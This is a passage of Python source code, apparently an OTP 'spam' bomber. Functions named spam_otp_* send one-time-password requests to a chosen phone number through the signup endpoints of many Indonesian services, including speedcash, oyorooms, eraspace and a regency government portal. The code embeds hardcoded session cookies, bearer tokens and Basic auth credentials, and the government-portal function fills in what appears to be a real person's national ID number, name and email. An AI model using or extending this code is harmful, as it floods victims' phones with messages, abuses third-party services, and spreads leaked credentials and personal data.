        KEY = '5JkPzCacn1Qj9cAl'
        IV = bytes(16)
        TS = int(time.time() * 1000)
        params = {'mobile': nomor, 'time_stamp': TS}
        data = aes_encrypt(json.dumps(params), KEY, IV)
        session = requests.Session()
        resp = session.post('https://uatas.id/delapi/web/passport/sendphonecode', headers={'accept': 'application/json', 'content-type': 'application/json', 'origin': 'https://uatas.id', 'referer': 'https://uatas.id/h5/gml/', 'user-agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'}, json={'uid': '0', 'ticket': '0', 'sec_level': '2', 'package_name': 'uatas', 'm_id': '10', 'data': data, 'version': '1.0.0'}, timeout=10)
        
        return resp.status_code == 200
    except:
        return False

import requests
import json
import random
import string

def spam_otp_fastwork(nomor):
    try:
        session = requests.Session()
        url = "https://api.fastwork.id/auth/v2/signup.sendVerificationCode"
        
        if nomor.startswith('+62'):
            nomor = '0' + nomor[3:]
        elif nomor.startswith('62'):
            nomor = '0' + nomor[2:]
        elif not nomor.startswith('0'):
            nomor = '0' + nomor
        
        headers = {
            'Content-Type': 'application/json'
        }
        
        payload = {
            'phone_number': nomor 
        }
        
        resp = session.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code == 200
    except:
        return False
        
def spam_otp_harvestcakes(nomor):
    try:
        session = requests.Session()
        url = "https://harvestcakes.com/register/"
        headers = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
            'Referer': 'https://harvestcakes.com/register/'
        }
       
        session.cookies.set('csrftoken', 'XB4NkYtw8pPrTQDx7X6JNUjT4xUs2ke1')
        
        data = {
            'csrfmiddlewaretoken': 'XB4NkYtw8pPrTQDx7X6JNUjT4xUs2ke1',
            'mobile_number': nomor,
            'toc': 'on'
        }
        
        resp = session.post(url, data=data, headers=headers, timeout=10)
        return resp.status_code == 200
    except:
        return False
       
def spam_otp_toss(nomor, nik="3603035707080002", nama="Suhaeriyah", email="suhaeriyahani@gmail.com"):
    try:
        session = requests.Session()
       
        url_get = "https://toss.tubankab.go.id/register"
        headers_get = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36'
        }
        
        resp_get = session.get(url_get, headers=headers_get, timeout=10)
        
        csrf_token = None
        match = re.search(r"_token':\s*'([^']+)'", resp_get.text)
        if match:
            csrf_token = match.group(1)
        else:
            match = re.search(r'name="_token"\s+value="([^"]+)"', resp_get.text)
            if match:
                csrf_token = match.group(1)
        
        if not csrf_token:
            return False
        
        url_post = "https://toss.tubankab.go.id/register/otp/act"
        headers_post = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Origin': 'https://toss.tubankab.go.id',
            'Referer': 'https://toss.tubankab.go.id/register',
            'X-Requested-With': 'XMLHttpRequest'
        }
        
        data = {
            'nik': nik,
            'nohp': nomor,
            'nama': nama,
            'email': email,
            '_token': csrf_token
        }
        
        resp_post = session.post(url_post, data=data, headers=headers_post, timeout=10)
        return resp_post.status_code == 200
        
    except Exception as e:
        print(f"Error: {e}")
        return False

def spam_otp_optikmelawai(nomor):
    try:
        if nomor.startswith('0'):
            nomor = '62' + nomor[1:]
        elif nomor.startswith('+62'):
            nomor = nomor[1:]
        elif not nomor.startswith('62'):
            nomor = '62' + nomor

        url = "https://api.optikmelawai.com/api/v2/auth/register/verify/phone/request"
        headers = {
            "Content-Type": "application/json",
            "Authorization": "Bearer a6a84b1f1e604d683fbef2295c2262373eba254197a1e14ab3a1e95a4394e4debf13560e5dbd66ab1e628aa3e73d3667d11f083077e562169b78d2ef2f3d285542a22f5ae174badd1313593deb5ec4389c75de38055b4964969a8323f031d47a6b35b3af4a096a08d6dddc2bf616c36bbeea1602b5b8a041650909107c207ed9",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Origin": "https://www.optikmelawai.com",
            "Referer": "https://www.optikmelawai.com/",
            "Accept": "application/json",
            "Language": "id"
        }
        payload = {
            "value": nomor,
            "provider": "mobile_number"
        }
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code < 400
    except:
        return False

def spam_otp_labamu(nomor):
    try:
        if nomor.startswith('0'):
            nomor = '+62' + nomor[1:]
        elif nomor.startswith('62'):
            nomor = '+' + nomor
        elif nomor.startswith('+62'):
            nomor = nomor
        else:
            nomor = '+62' + nomor
        
        import uuid
        device_id = str(uuid.uuid4())
        
        url = 'https://api.cashenable.com/authentication/v2/coreauth'
        
        headers = {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'no-cache, no-store, must-revalidate, max-age=0',
            'content-type': 'application/json',
            'device_id': device_id,
            'device_name': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36',
            'device_type': 'desktop',
            'expires': '0',
            'origin': 'https://desktop.labamu.co.id',
            'pragma': 'no-cache',
            'priority': 'u=1, i',
            'referer': 'https://desktop.labamu.co.id/',
            'sec-ch-ua': '"Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'source': 'Desktop',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36'
        }
        
        payload = {
            "identifier": nomor,
            "auth_method": "whatsapp"
        }
        
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code == 201
        
    except Exception as e:
        return False

def spam_otp_hijup(nomor):
     try:
        if nomor.startswith("0"):
            nomor_lokal = "62" + nomor[1:]
        elif nomor.startswith("+"):
            nomor_lokal = nomor[1:]
        elif nomor.startswith("62"):
            nomor_lokal = nomor
        else:
            nomor_lokal = "62" + nomor
        
        session = requests.Session()
        url = "https://www.hijup.com/sign_in"
        
        headers = {
            'Content-Type': 'text/plain;charset=UTF-8',
            'Origin': 'https://www.hijup.com',
            'next-action': 'b7eda6e749fbadcfcf226c2e36865091520b679f',
            'next-router-state-tree': '%5B%22%22%2C%7B%22children%22%3A%5B%5B%22merchant%22%2C%22hijup%22%2C%22d%22%5D%2C%7B%22children%22%3A%5B%22sign_in%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%5D%7D%5D%7D%5D%7D%2Cnull%2Cnull%2Ctrue%5D',
            'next-url': '/sign_in',
            'Referer': 'https://www.hijup.com/sign_in',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36'
        }
        
        payload = f'[{{"phone_number":"{nomor_lokal}","store_path":"hijup"}}]'
        
        resp = session.post(url, data=payload, headers=headers, timeout=10)
        return resp.status_code < 400
     except:
        return False
        
def spam_otp_toyota(nomor):
    try:
        if nomor.startswith('0'):
            nomor = '62' + nomor[1:]
        elif nomor.startswith('+62'):
            nomor = nomor[1:]
        elif nomor.startswith('62'):
            nomor = nomor
        else:
            nomor = '62' + nomor

        import random
        first = ['Andi', 'Budi', 'Citra', 'Dewi', 'Eko', 'Fajar', 'Gina', 'Hana', 'Irwan', 'Joko', 'Rina', 'Sari', 'Agus', 'Bayu']
        last = ['Santoso', 'Wijaya', 'Susanto', 'Rahayu', 'Kusuma', 'Pratama', 'Sari', 'Putra', 'Wati', 'Hidayat', 'Lestari', 'Gunawan']
        nama = f'{random.choice(first)} {random.choice(last)}'
        email = f"{nama.lower().replace(' ', '')}{random.randint(10, 99)}@gmail.com"
        
        url_token = 'https://data-web.tam-icm.com/api/public/vendors/tokenize'
        headers_token = {
            'Authorization': 'Basic ZGlkeDpUb3lvdGEyMDI0',
            'Content-Type': 'application/json',
            'Accept': 'application/json',
            'Origin': 'https://www.toyota.astra.co.id',
            'Referer': 'https://www.toyota.astra.co.id/',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        payload_token = {
            "data": [nomor, nama, email]
        }
        
        resp_token = requests.post(url_token, json=payload_token, headers=headers_token, timeout=10)
        token_data = resp_token.json()
        
        phone_token = None
        if isinstance(token_data, list):
            for item in token_data:
                if item.get('status') == 'Succeed' and item.get('token'):
                    phone_token = item.get('token')
                    break
        
        if not phone_token:
            return False
        
        url = 'https://data-web.tam-icm.com/api/public/vendors/register'
        headers = {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'no-cache',
            'content-type': 'application/json',
            'origin': 'https://www.toyota.astra.co.id',
            'pragma': 'no-cache',
            'referer': 'https://www.toyota.astra.co.id/',
            'sec-ch-ua': '"Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36'
        }
        payload = {
            "phoneNumber": phone_token
        }
        
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code == 200
        
    except Exception as e:
        return False

def spam_otp_speedcash(nomor):
    try:
        if nomor.startswith('62'):
            nomor_lokal = '0' + nomor[2:]
        elif nomor.startswith('+62'):
            nomor_lokal = '0' + nomor[3:]
        elif nomor.startswith('0'):
            nomor_lokal = nomor
        else:
            nomor_lokal = '0' + nomor
        
        user_uuid = str(uuid.uuid4())
        
        token = 'YzZmNDM2YzliYjVkMDE1Y2I4MDhmYjFlMjY5NDA3MTgwYmEzMWQ1NmNjZjNmMzQ1Yjc2NTM1MDIyZTFlMDUwY2ZmMTY5MzVmZTMyZjIyOTM2ZmNmZjZhZmM4MDRhNjM2'
        csrf_token = '59ede118a56b18219b68092070e7dae6abd956966fc3efdbb24b3a6d6011294126a4f2d69b8e0981ef89c38eac4e9c8028839da1c784aa61357a1a1878f9c261'
        xsrf_token = 'eyJpdiI6IlExczFmb0ZkNFpTdDVpUGVZMkxXc0E9PSIsInZhbHVlIjoidDNDeUVyRkxVVytidCtKVHUzdUxDUWpIbUcyREFCY2hwSk9pS1pvZlFhRVhBazBmSzVxTlUwbXRvNzlKOXQ0ciIsIm1hYyI6IjMzMTQwYmNiODk3ZWZlYzExYzFlZGE0ZDEwNGM4ZGM3NGJlYmFjN2M3YjkyODk1MGIxMGQwYjkzMjFiNDU0ZjUifQ=='
        
        cookie = 'page=eyJpdiI6Imw0VjhuMURFXC9BMHBaNmRIS3JTMjJnPT0iLCJ2YWx1ZSI6IldnK1pWU01sYUpxdzZxa1VTdCt2Wnc9PSIsIm1hYyI6ImIwNGNjZmRlNzljMGI0MDgwYTYxYTUxZDlkYzIxYTRjZmRhYmE4ZmU2MTA4MzVlOGMwZTQ2MWFlZTRjNjJhOWEifQ%3D%3D; XSRF-TOKEN=eyJpdiI6IlExczFmb0ZkNFpTdDVpUGVZMkxXc0E9PSIsInZhbHVlIjoidDNDeUVyRkxVVytidCtKVHUzdUxDUWpIbUcyREFCY2hwSk9pS1pvZlFhRVhBazBmSzVxTlUwbXRvNzlKOXQ0ciIsIm1hYyI6IjMzMTQwYmNiODk3ZWZlYzExYzFlZGE0ZDEwNGM4ZGM3NGJlYmFjN2M3YjkyODk1MGIxMGQwYjkzMjFiNDU0ZjUifQ%3D%3D; speedcash_session=eyJpdiI6Im9FMEZmV1UzWUVhemVMWEgxQTl0XC93PT0iLCJ2YWx1ZSI6IlFVSENcL2ErcUV0QVZxTmp6UmowS1wvVEx1aFJyVmN1VTdjNFZJbGp3MDZ4SUV6NzR4bjFyM1J4cm1xM0dFY0VhWSIsIm1hYyI6ImI3YWMzZWRkMGRmOGUwNmYzZDI1MTg0ODExM2YzZjAxMTc3N2ZiNDFhNGExZTI5Zjc4NWI5NWYzNDUzZDY1ZWYifQ%3D%3D; x-csrf-token=59ede118a56b18219b68092070e7dae6abd956966fc3efdbb24b3a6d6011294126a4f2d69b8e0981ef89c38eac4e9c8028839da1c784aa61357a1a1878f9c261%7Ce3ea9ac3647ed09e8ce98e1ed23cc4b2a31687a7c2ad53a95d9da905af9f1a33'
        
        curl_command = f'''curl -s -X POST 'https://member.speedcash.co.id/api/twice/otp/generate' \
  -H 'accept: application/json, text/plain, */*' \
  -H 'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \
  -H 'authorization: Bearer {token}' \
  -H 'content-type: application/json' \
  -H 'cookie: {cookie}' \
  -H 'origin: https://member.speedcash.co.id' \
  -H 'referer: https://member.speedcash.co.id/' \
  -H 'sec-ch-ua: "Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Windows"' \
  -H 'sec-fetch-dest: empty' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-site: same-origin' \
  -H 'time-request: {str(int(time.time() * 1000))}' \
  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36' \
  -H 'x-csrf-token: {csrf_token}' \
  -H 'x-xsrf-token: {xsrf_token}' \
  -d '{{"version_name": "3.2.0", "version_code": "270", "uuid": "{user_uuid}", "app_id": "SPEEDCASH", "appid": "SPEEDCASH", "location": "0,0", "phone": "{nomor_lokal}", "state": "REGISTER", "type": "WA", "user_uuid": "{user_uuid}", "via": "BEBASBAYAR"}}' '''
        
        result = subprocess.run(curl_command, shell=True, capture_output=True, text=True)
        
        if result.returncode == 0:
            try:
                return json.loads(result.stdout)
            except:
                return {"response": result.stdout}
        else:
            return {"error": result.stderr}
            
    except Exception as e:
        return {"error": str(e)}

def spam_otp_speedcash_sms(nomor):
    try:
        if nomor.startswith('0'):
            phone = nomor
        elif nomor.startswith('62'):
            phone = '0' + nomor[2:]
        elif nomor.startswith('+62'):
            phone = '0' + nomor[3:]
        else:
            phone = '0' + nomor

        user_uuid = str(uuid.uuid4())
        
        cookie_string = '_gcl_au=1.1.179635825.1783143670; _tt_enable_cookie=1; _ttp=01KWNTA9MFMPRKVN4403SGAP5F_.tt.2; _gid=GA1.3.23590014.1783143677; page=eyJpdiI6IndNdG9LMWFLcnNQekhqMEhKcFwvb0VnPT0iLCJ2YWx1ZSI6IitCXC8xd2E2MXJlejhYZmxsN2k0ZzhRPT0iLCJtYWMiOiJlYjM2OWViNDA3NTJkNDk0YzExZjBiMDYwZDBkNDY0ZGIwZjgzNGNkMjNhMGMzNmY4ZWNmYWFmYjk1NDdiNWU0In0%3D; ttcsid_BQG0RGGAC2KB0QR0PJOG=1783161126775::fUH_lmHk7dEJSxbUqs_Q.2.1783161197355.1; ttcsid=1783161126780::Ub-TvvCt0eosFi2US8Ta.2.1783161197354.0::1.-2978.0::70607.4.265.339::0.0.0; XSRF-TOKEN=eyJpdiI6IjdaVHpFODVWY0V0b21jYjk4enhcLzFBPT0iLCJ2YWx1ZSI6ImNkcVNNblwvbUlrdXNMck5ndEh6M1J6dGhqTU9YTlF5OFBNN3FNQ3oxK3VIVlFMcGtnUkJSbXBKMEtyRGZONGlEIiwibWFjIjoiZWY0OTUwZDFmYzcxMDA1MDI3ZWI0YzhlNTI2YjQ5ODI1ZTc2YmJhNTkwYTZkOGQ0MzZlNTFiYTg1ZWE0OWMxNSJ9; speedcash_session=eyJpdiI6Inc1V211ZG1VZVhvWHRCREpkNlg5M2c9PSIsInZhbHVlIjoiRlUwaVFmMTZcL1wvQk4rZUhpT28rK2x6MjhGaHl6U3hlVGVJdHdVbWVxWW9LR0RDdXBcL1pMRjl4Y2NvMWZZTHhScCIsIm1hYyI6ImJhMzFmN2I0MzgxNjkyZmE0MDVhZTIyMmY0YTdkNGU2MDhmYmQyYjQyYjA2MTQzYWRiODBiNTRiNGU4ZGRlZDkifQ%3D%3D; _ga_K62HPWSYN0=GS2.1.s1783161125$o2$g1$t1783161200$j58$l0$h0; _ga_YYBXGTQ7Y7=GS2.1.s1783161125$o2$g1$t1783161200$j58$l0$h0; _ga_36YJ2HBQBW=GS2.1.s1783161125$o2$g1$t1783161200$j58$l0$h0; _ga_L47B4F33R0=GS2.1.s1783161125$o2$g1$t1783161200$j58$l0$h885576571; _ga=GA1.3.1971373087.1783143671; x-csrf-token=b7001f72363a50f6976f8ad85bbfe8cab97b1a131a3be8c0ab0225ef069f10e1903ab21033744f14a28dcb8df03346eb685a0b46ca2a6000cf649e29b2ad7b5a%7C3e19bf11f091623f6a3a179f6bd95740c64fdeca0cb7ed897449c093e7e888c4; _gat_UA-62117787-3=1'

        xsrf_token = 'eyJpdiI6IjdaVHpFODVWY0V0b21jYjk4enhcLzFBPT0iLCJ2YWx1ZSI6ImNkcVNNblwvbUlrdXNMck5ndEh6M1J6dGhqTU9YTlF5OFBNN3FNQ3oxK3VIVlFMcGtnUkJSbXBKMEtyRGZONGlEIiwibWFjIjoiZWY0OTUwZDFmYzcxMDA1MDI3ZWI0YzhlNTI2YjQ5ODI1ZTc2YmJhNTkwYTZkOGQ0MzZlNTFiYTg1ZWE0OWMxNSJ9'

        csrf_token = 'b7001f72363a50f6976f8ad85bbfe8cab97b1a131a3be8c0ab0225ef069f10e1903ab21033744f14a28dcb8df03346eb685a0b46ca2a6000cf649e29b2ad7b5a'

        authorization = 'Bearer YzZmNDM2YzliYjVkMDE1Y2I4MDhmYjFlMjY5NDA3MTgwYmEzMWQ1NmNjZjNmMzQ1Yjc2NTM1MDIyZTFlMDUwY2ZmMTY5MzVmZTMyZjIyOTM2ZmNmZjZhZmM4MDRhNjM2'

        data = {
            "version_name": "3.2.0",
            "version_code": "270",
            "uuid": user_uuid,
            "user_uuid": user_uuid,
            "via": "BB MOBILE WEB",
            "app_id": "SPEEDCASH",
            "appid": "SPEEDCASH",
            "location": "0,0",
            "phone": phone,
            "state": "REGISTER",
            "type": "SMS"
        }
        
        data_json = json.dumps(data)
        timestamp = str(int(time.time() * 1000))
        
        curl_otp = f'''curl -k -s -X POST 'https://member.speedcash.co.id/api/twice/otp/generate' \
  -H 'accept: application/json, text/plain, */*' \
  -H 'accept-encoding: gzip, deflate, br, zstd' \
  -H 'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \
  -H 'authorization: {authorization}' \
  -H 'content-type: application/json' \
  -H 'cookie: {cookie_string}' \
  -H 'origin: https://member.speedcash.co.id' \
  -H 'referer: https://member.speedcash.co.id/' \
  -H 'sec-ch-ua: "Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"' \
  -H 'sec-ch-ua-mobile: ?1' \
  -H 'sec-ch-ua-platform: "Android"' \
  -H 'sec-fetch-dest: empty' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-site: same-origin' \
  -H "time-request: {timestamp}" \
  -H 'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Mobile Safari/537.36' \
  -H 'x-csrf-token: {csrf_token}' \
  -H 'x-xsrf-token: {xsrf_token}' \
  --data-raw '{data_json}' '''

        result = subprocess.run(curl_otp, shell=True, capture_output=True, text=True)

        if result.returncode == 0:
            try:
                response = json.loads(result.stdout)
                return response.get('rc') == '00'
            except:
                return True
        return False

    except Exception as e:
        return False

def spam_otp_nutriclub(nomor):
    try:
        if nomor.startswith('0'):
            nomor = nomor
        elif nomor.startswith('62'):
            nomor = '0' + nomor[2:]
        elif nomor.startswith('+62'):
            nomor = '0' + nomor[3:]
        else:
            nomor = '0' + nomor

        session = requests.Session()

        headers = {
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-encoding': 'gzip, deflate, br, zstd',
            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-length': '0',
            'origin': 'https://www.nutriclub.co.id',
            'priority': 'u=1, i',
            'referer': 'https://www.nutriclub.co.id/membership/api/otp',
            'sec-ch-ua': '"Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest'
        }

        params = {
            'phone': nomor,
            'old_phone': nomor
        }

        url = 'https://www.nutriclub.co.id/membership/otp/'

        resp = session.post(url, params=params, headers=headers, timeout=10)

        if resp.status_code == 200:
            try:
                data = resp.json()
                if data.get('status') == 'success' or data.get('success') == True:
                    return True
                return False
            except:
                return True
        return False

    except Exception as e:
        return False
        
def spam_otp_oyorooms(nomor):
    try:
        if nomor.startswith('0'):
            nomor = nomor[1:]
        elif nomor.startswith('+62'):
            nomor = nomor[3:]
        elif nomor.startswith('62'):
            nomor = nomor[2:]
        
        nomor = ''.join(filter(str.isdigit, nomor))
        
        if len(nomor) < 10:
            return False
        
        session = requests.Session()
        
        cookies = {
            'delta_ver': '1783169391.895.680.781361|30a98be7397e93d8ee905a77f63b5c5a',
            '_csrf': 'z2qem89SAImhv-99mY7Qz43S',
            'acc': 'IN',
            'locale': 'id',
            'X-Location': 'undefined',
            'mab': 'bb752a6c73fad035dc2ea0697579750f',
            'expd': 'mww2%3A1%7Cioab%3A1%7Cmhdp%3A1%7Cbcrp%3A0%7Cpwbs%3A1%7Cslin%3A1%7Chsdm%3A2%7Ccomp%3A0%7Cnrmp%3A1%7Cnhyw%3A1%7Cgcer%3A1%7Crecs%3A1%7Cswhp%3A1%7Clvhm%3A1%7Cgmbr%3A0%7Cyolo%3A1%7Crcta%3A1%7Ccbot%3A1%7Cotpv%3A1%7Ctrtr%3A0%7Clbhw%3A1%7Cndbp%3A0%7Cmapu%3A1%7Cnclc%3A1%7Cdwsl%3A1%7Ceopt%3A1%7Cotpv%3A1%7Cwizi%3A1%7Cmorr%3A1%7Cyopb%3A0%7CTTP%3A1%7Caimw%3A1%7Chdpn%3A0%7Cweb2%3A0%7Cspw1%3A0%7Cstrf%3A1%7Cltvr%3A1%7Cwizz%3A1%7Clpcp%3A1%7Cclhp%3A1%7Cprwt%3A1%7Ccbhd%3A1%7Cins2%3A3%7Cmcal%3A1%7Cmhdc%3A1%7Cmcal%3A1%7Clopo%3A1%7Cptax%3A1%7Ciiat%3A0%7Cpbnb%3A0%7Cror2%3A1%7Cmbwe%3A0%7Cmboe%3A0%7Cctry%3A1%7Cmshd%3A1%7Csovb%3A2%7Cctrm%3A1%7Cofcr%3A1%7Ciupi%3A1%7Cnbi1%3A3%7Crwtg%3A1%7Cstow%3A1%7Cimtg%3A2%7Cptpa%3A1%7Cormp%3A1%7Cpbre%3A0%7Cllat%3A0%7Cesmi%3A0%7Chdam%3A0',
            'appData': '%7B%22userData%22%3A%7B%22isLoggedIn%22%3Afalse%7D%7D',
            'token': 'SFI4TER1WVRTakRUenYtalpLb0w6VnhrNGVLUVlBTE5TcUFVZFpBSnc%3D',
            '_uid': 'Not%20logged%20in',
            'XSRF-TOKEN': 'bYRZoRu5-6fyXF51wSMdrrS0EAYDpphLOsfw',
            'ql': 'true',
            '_gcl_au': '1.1.1098408214.1783169392',
            'isHomepageViewed': 'true',
            'fingerprint2': 'a19e43fe531de889917ff09bd9c00e3b',
            '_ga': 'GA1.2.301009132.1783169392',
            '_gid': 'GA1.2.1435061004.1783169397'
        }
        
        session.cookies.update(cookies)
        
        fingerprint = "a19e43fe531de889917ff09bd9c00e3b"
        device_id = fingerprint + "530311"
        sdata = "eyJrdWQiOlsyNDIwMCwxNDUwMCwxMjcwMCwxOTUwMCwxMzkwMCwxNDAwMCwxNDUwMCwxNzAwMCwxMzcwMCwxMzAwMCwxMTkwMF0sImFjYyI6W10sImd5ciI6W10sInR1ZCI6WzE2MDAsMzAyMDAsNDQ5MDAsNDE1NzAwLDMxMTUwMCwyOTY4MDAsMzQ1NDAwLDM5NTcwMCwyOTYyMDAsMjEzODAwLDk2NTAwLDk3NjAwLDExMjEwMCwxNzkyMDAsMTE0NjAwLDE0NjcwMCw5NjQwMCwzMjY0MDAsMzQ0NjAwLDMyODQwMCwzMjgwMDAsMzYwNzAwLDUxMTMwMCw2NDQ0MDAsMzEzNzAwLDI4NzAwLDYxNjAwLDk1MzAwXSwidGlkIjpbNTYzMTAwMCwxNzM2MDIwMCw2MTk4MTAwLDExMzQwMDAsMzA0MjAwLDIwMTkwMCwyMjA5MDAsMjIwNTAwLDE4NjcwMCwxNjkwMDAsNTY4ODAwLDcwMjMwMCw5Njk5MDAsMjg3MDAwLDUzNTAwMCw3MTg3MDAsNjAyODAwLDEyMjE2MDAsMTcxMTAwLDIwNjEwMCwyMjA0MDAsMTg4MzAwLDE3MTMwMCw2NTYwMDAsMzM1NzAwLDM4NjgwMCw4MDIyNzgwMCwxMTc5MzQwMF0sImtpZCI6WzEyNzM5MTEwMCwxOTM1MDAsMjMyMTAwLDIyMjUwMCwyNDU5MDAsMjY5MzAwLDE1MjMwMCwyMzQ2MDAsMTY2NjAwLDIwNDEwMCwxODYyMDBdLCJ0bXYiOltbeyJ4IjoyNDcsInkiOjM2OX0seyJ4IjoyNTUsInkiOjM0Mn0seyJ4IjozMjcsInkiOjE4OX0seyJ4IjozMzUsInkiOjE3Nn1dLFt7IngiOjI1NSwieSI6MzYyfSx7IngiOjI1OSwieSI6MzU0fSx7IngiOjM0NywieSI6MTc4fSx7IngiOjM1MSwieSI6MTcyfV0sW3sieCI6MjQwLCJ5Ijo1MTZ9LHsieCI6MjM4LCJ5Ijo1MjZ9LHsieCI6MjM3LCJ5Ijo1Mzh9LHsieCI6MjM3LCJ5Ijo1NDB9LHsieCI6MjM3LCJ5Ijo1Mzl9XSxbeyJ4IjoyNTUsInkiOjM1MX0seyJ4IjoyNTMsInkiOjM1OX0seyJ4IjoyMzUsInkiOjUwMH0seyJ4IjoyMzUsInkiOjUyNX0seyJ4IjoyMzUsInkiOjUzN31dLFt7IngiOjIwMCwieSI6MzIxfSx7IngiOjIwNSwieSI6MzA3fSx7IngiOjIyMywieSI6MjU2fSx7IngiOjIyMywieSI6MjU2fV1dfQ=="
        
        headers = {
            'accept': '*/*',
            'accept-language': 'id',
            'content-type': 'application/json',
            'origin': 'https://identity-gateway.oyorooms.com',
            'referer': 'https://identity-gateway.oyorooms.com/login',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Mobile Safari/537.36',
            'access_token': 'SFI4TER1WVRTakRUenYtalpLb0w6VnhrNGVLUVlBTE5TcUFVZFpBSnc=',
            'deviceid': device_id,
            'fingerprint_hash': fingerprint,
            'loc': '153',
            'sData': sdata,
            'externalHeaders': '[object Object]',
            'XSRF-TOKEN': 'bYRZoRu5-6fyXF51wSMdrrS0EAYDpphLOsfw'
        }
        
        payload = {
            "phone": nomor,
            "country_code": "+62",
            "nod": 4
        }
        
        r = session.post('https://identity-gateway.oyorooms.com/api/pwa/generateotp?locale=id',
            json=payload,
            headers=headers,
            timeout=10
        )
        
        if r.status_code == 200:
            try:
                data = r.json()
                status = data.get('status', '')
                is_user_present = data.get('is_user_present', False)
                
                if status == "correct" and is_user_present:
                    return True
                elif status == "correct" and not is_user_present:
                    return False
                else:
                    return False
            except:
                return True if r.status_code == 200 else False
        else:
            return False
        
    except Exception as e:
        return False

def spam_otp_eraspace(nomor):
    try:
        if nomor.startswith('0'):
            nomor = '62' + nomor[1:]
        elif nomor.startswith('+62'):
            nomor = nomor[1:]
        elif nomor.startswith('62'):
            nomor = nomor
        else:
            nomor = '62' + nomor

        device_id = "5f9a82ca-f6c9-4f53-9381-9f90bb7d6959"
        epoch = "1782980896"
        signature = "bc66090c506a1847f5a5cd044ba3643b9d655e489b36bcff1533ef813ad882d0"

        url = 'https://jeanne.eraspace.com/customers/v3/otp/request'

        headers = {
            'accept': 'application/json, text/plain, */*',
            'authorization': 'Basic Y3VzdGJhc2ljOk9MV2llWlVvQlA=',
            'content-type': 'application/json',
            'device-id': device_id,
            'epoch': epoch,
            'origin': 'https://eraspace.com',
            'otp-client': 'eraspace',
            'otp-provider': 'whatsapp',
            'referer': 'https://eraspace.com/',
            'signature': signature,
            'sms-client': 'eraspace',
            'source': 'eraspace',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36'
        }

        payload = {
            "identifier": nomor,
            "regionCode": "ID",
            "type": "identifier_validation"
        }

        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code == 200

    except Exception as e:
        return False

def spam_otp_acc(nomor):
    try:
        if nomor.startswith('0'):
            nomor = nomor
        elif nomor.startswith('62'):
            nomor = '0' + nomor[2:]
        elif nomor.startswith('+62'):
            nomor = '0' + nomor[3:]
        else:
            nomor = '0' + nomor
        
        nomor = ''.join(filter(str.isdigit, nomor))
        
        if len(nomor) < 10:
            return False
        
        session = requests.Session()
        
        cookies = {
